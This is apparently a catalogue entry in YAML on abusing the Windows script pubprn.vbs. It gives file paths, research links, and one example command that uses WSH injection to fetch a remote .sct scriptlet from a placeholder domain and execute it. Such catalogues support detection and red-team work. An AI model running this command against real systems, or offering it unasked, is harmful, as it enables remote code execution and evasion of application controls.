---
name: pubprn.vbs
description: Used by Windows for printer management
functions:
  execute:
    - description: Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection.
      code: pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct
resources: 
    - resource: https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
    - resource: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
    - resource: https://github.com/enigma0x3/windows-operating-system-archaeology
fullpath: 
    - path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
    - path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
notes: Thanks to Matt Nelson - @enigma0x3
---